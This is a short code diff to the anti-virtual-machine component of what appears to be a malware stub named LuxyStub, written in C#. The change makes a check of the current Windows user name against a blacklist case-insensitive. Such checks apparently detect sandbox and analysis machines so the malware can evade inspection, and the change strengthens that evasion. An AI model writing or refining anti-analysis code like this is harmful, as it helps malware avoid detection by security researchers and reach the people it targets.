@@ -104,7 +104,7 @@ namespace LuxyStub.Components.AntiVM
 
         static private bool CheckUsername()
         {
-            bool isBlacklistedUser = BlacklistedUsers.Contains(Environment.UserName);
+            bool isBlacklistedUser = BlacklistedUsers.Contains(Environment.UserName.ToLower());
             return isBlacklistedUser;
         }
 
